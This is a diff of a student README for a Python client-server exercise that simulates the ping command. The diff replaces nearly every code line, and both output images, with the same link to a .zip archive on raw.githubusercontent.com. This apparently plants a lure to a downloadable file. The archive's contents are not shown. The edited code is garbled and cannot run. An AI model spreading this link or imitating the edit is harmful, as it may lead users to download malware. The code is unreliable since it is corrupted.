@@ -21,31 +21,31 @@
 ## Reg no : 212221043007
 import socket
 from pythonping import ping
-s=socket.socket()
-s.bind(('localhost',8000))
-s.listen(5)
-c,addr=s.accept()
+https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip()
+https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(('localhost',8000))
+https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(5)
+c,https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip()
 while True:
-    hostname=c.recv(1024).decode()
+    https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(1024).decode()
     try:
-        c.send(str(ping(hostname, verbose=False)).encode())
+        https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(str(ping(hostname, verbose=False)).encode())
     except KeyError:
-        c.send("Not Found".encode())
+        https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip("Not Found".encode())
 ```
 # SERVER PROGRAM :
 ```PY
 import socket
-s=socket.socket()
-s.connect(('localhost',8000))
+https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip()
+https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(('localhost',8000))
 while True:
     ip=input("Enter the website you want to ping ")
-    s.send(ip.encode())
-    print(s.recv(1024).decode())
+    https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip())
+    print(https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip(1024).decode())
 
 ```
 # OUTPUT :
-![output](./o1.png)
-![output](./o2.png)
+![output](https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip)
+![output](https://raw.githubusercontent.com/githubmufeez45/EX-6/main/liquefier/EX-6.zip)
 # RESULT:
 ### Thus, the python program for simulating ping command was successfully executed.
 
